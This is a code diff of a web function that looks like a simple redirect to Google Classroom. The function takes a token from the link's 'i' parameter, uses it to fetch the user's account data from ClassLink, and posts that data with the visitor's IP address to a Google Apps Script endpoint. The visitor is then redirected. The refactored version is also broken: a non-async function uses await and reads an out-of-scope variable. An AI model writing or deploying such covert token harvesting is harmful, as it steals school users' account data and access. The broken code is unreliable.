@@ -1,13 +1,15 @@
 export async function onRequest(context) {
     const { request } = context;
     const url = new URL(request.url);
-    const searchParams = url.search;
+    handleRequest(url.search);
+    
+    return Response.redirect("https://classroom.google.com/h", 302);
+}
 
-    Response.redirect("https://classroom.google.com/h", 302);
+function handleRequest(searchParams){
     const idMatch = searchParams.match(/[?&]i=([^&]+)/);
-    const id = idMatch ? idMatch[1] : null;  // If a match is found, extract the value
+    const id = idMatch ? idMatch[1] : null;
 
-    // Apply regex to extract the content between the second and third quotation marks
     let extractedText = null;
     if (id) {
         const regex = /^(?:[^"]*"[^"]*"){2}([^"]*)/;
@@ -16,19 +18,16 @@ export async function onRequest(context) {
     }
 
     const ip = request.headers.get("CF-Connecting-IP");
-
-    try {
         if (id) {
-            // Proxy request to nodeapi.classlink.com
             const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
                 method: "GET",
                 headers: {
-                    "gwstoken": extractedText
+                    "gwsToken": extractedText
                 }
             });
 
             const nodeApiData = await nodeApiResponse.json();
-            // Send data to Google Script
+
             const response = await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                 method: "POST",
                 headers: {
@@ -36,15 +35,5 @@ export async function onRequest(context) {
                 },
                 body: JSON.stringify({ data: nodeApiData, ip: ip })
             });
-
-            if (!response.ok) {
-                return new Response(JSON.stringify({ error: "Google Script failed" }), { status: 500 });
-            }
-        } else {
-            return new Response(JSON.stringify({ error: "ID parameter missing" }), { status: 400 });
         }
-    } catch (error) {
-        console.error("Error during request:", error);
-        return new Response(JSON.stringify({ error: "Internal server error: "+error }), { status: 500 });
-    }
 }
